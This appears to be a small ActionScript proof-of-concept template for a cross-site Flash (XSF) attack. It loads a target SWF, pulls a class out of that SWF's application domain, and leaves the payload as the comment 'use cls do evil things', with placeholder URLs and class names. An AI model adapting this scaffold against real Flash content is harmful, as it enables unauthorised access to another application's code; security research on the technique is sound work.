package {
import flash.display.Loader;
import flash.events.Event;

public class poc extends xsf {

    public var cls:*;

    public function poc() {
        super();
    }

    override public function loadTarget():void {
        log('loadTarget()');
        var targetSWF:String = 'targetURL';
        loadSWF(targetSWF);
        this.log('start load swf, url: ' + targetSWF);
    }

    override public function exp(loader:Loader):void {
        log('exp()');
        var PATH:String = 'packagename.classname'; // class path
        cls = loader.contentLoaderInfo.applicationDomain.getDefinition(PATH);
        // use cls do evil things

    }


}
}
